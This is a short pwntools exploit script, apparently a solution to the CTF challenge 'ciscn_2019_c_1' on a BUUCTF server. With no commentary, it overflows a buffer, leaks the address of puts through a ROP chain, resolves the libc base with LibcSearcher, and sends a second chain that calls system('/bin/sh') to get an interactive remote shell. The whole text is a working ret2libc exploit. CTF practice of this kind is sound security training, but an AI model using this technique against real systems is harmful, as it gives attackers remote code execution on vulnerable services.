from pwn import*
from LibcSearcher import *
r=remote("node4.buuoj.cn",26336)
elf=ELF("./ciscn_2019_c_1")
ret=0x400c83
plt=elf.plt['puts']
got=elf.got['puts']
main_addr=0x400B28
r.recv()
r.sendline(b"1")
r.recvuntil(b"encrypted\n")
p=b"a"*0x58+p64(ret)+p64(got)+p64(plt)+p64(main_addr)
r.sendline(p)
r.recvuntil(b"Ciphertext\n")
r.recvuntil(b"\n")
addr=u64(r.recv(6).ljust(0x8,b"\x00"))
libc=LibcSearcher("puts",addr)
libcbase=addr-libc.dump("puts")
print(libcbase)
r.recv()
r.sendline(b"1")
r.recvuntil(b"encrypted\n")
sys_addr=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')
res=0x4006b9
p1=b"a"*0x58+p64(res)+p64(ret)+p64(bin_sh)+p64(sys_addr)
r.sendline(p1)
r.interactive()

